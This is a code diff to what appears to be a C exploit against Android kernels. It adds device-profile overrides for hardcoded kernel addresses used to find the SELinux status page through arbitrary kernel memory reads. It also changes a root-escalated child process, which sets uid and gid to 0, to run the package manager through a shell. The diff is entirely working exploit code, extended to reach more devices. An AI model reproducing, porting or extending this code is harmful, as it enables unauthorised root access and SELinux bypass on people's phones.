@@ -12,6 +12,7 @@
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <malloc.h>
 #include <string.h>
 #include <sys/ioctl.h>
 #include <sys/mman.h>
@@ -843,18 +844,21 @@ static int kernel_grant_full_caps(int fd, uint32_t cred) {
 static int kernel_read_u32(int fd, uint32_t target, uint32_t *value);
 static int kernel_ptr(uint32_t p);
 
-#define SELINUX_STATUS_PAGE 0xc100c3e8u
-#define GL_MEM_MAP 0xc1001ac4u
-#define GL_PFN_OFFSET 0xc0f0bb44u
+#define SELINUX_STATUS_PAGE_DEFAULT 0xc100c3e8u
+#define GL_MEM_MAP_DEFAULT 0xc1001ac4u
+#define GL_PFN_OFFSET_DEFAULT 0xc0f0bb44u
 #define GL_VA_SUB 0x81000000u
 #define GL_STATUS_BIAS 0x1000000u
 #define GL_STATUS_SCAN_PAGES 8192
 
 static int gl_status_page_va(int fd, uint32_t *out) {
+    uint32_t sp = g_profile.selinux_status_page ? g_profile.selinux_status_page : SELINUX_STATUS_PAGE_DEFAULT;
+    uint32_t mm = g_profile.mem_map_va ? g_profile.mem_map_va : GL_MEM_MAP_DEFAULT;
+    uint32_t pf = g_profile.pfn_offset_va ? g_profile.pfn_offset_va : GL_PFN_OFFSET_DEFAULT;
     uint32_t page = 0, mem_map = 0, pfnoff = 0;
-    if (!kernel_read_u32(fd, SELINUX_STATUS_PAGE, &page) || !kernel_ptr(page) ||
-        !kernel_read_u32(fd, GL_MEM_MAP, &mem_map) || !kernel_ptr(mem_map) ||
-        !kernel_read_u32(fd, GL_PFN_OFFSET, &pfnoff))
+    if (!kernel_read_u32(fd, sp, &page) || !kernel_ptr(page) ||
+        !kernel_read_u32(fd, mm, &mem_map) || !kernel_ptr(mem_map) ||
+        !kernel_read_u32(fd, pf, &pfnoff))
         return 0;
     *out = ((pfnoff + ((page - mem_map) >> 5)) << 12) - GL_VA_SUB;
     return 1;
@@ -1216,7 +1220,7 @@ static void run_pm(const char *action, const char *pkg) {
         }
         setresgid(0, 0, 0);
         setresuid(0, 0, 0);
-        execl("/system/bin/pm", "pm", action, pkg, (char *)NULL);
+        execl("/system/bin/sh", "sh", "/system/bin/pm", action, pkg, (char *)NULL);
         _exit(127);
     }
     if (c > 0) {
